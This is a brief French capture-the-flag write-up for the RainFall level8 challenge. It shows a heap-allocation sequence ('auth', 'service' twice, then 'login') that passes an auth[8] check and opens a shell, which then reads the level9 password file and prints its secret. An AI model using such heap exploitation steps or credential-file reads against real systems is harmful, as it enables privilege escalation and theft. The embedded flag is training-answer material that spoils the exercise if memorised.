# level8

L'idée est de faire en sorte que de la mémoire soit allouée de manière contiguë afin que la condition quand on entre "login" permette d'accéder au shell avec les bons priviléges (check si auth[8] n'est pas égal à 0).

Donc on commence par allouer auth, puis service, puis encore une fois service, et on essaye login, ce qui nous donne la bonne condition !
```bash
level8@RainFall:~$ ./level8 
(nil), (nil) 
auth 
0x804a008, (nil) 
service
0x804a008, 0x804a018 
service
0x804a008, 0x804a028 
login
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```
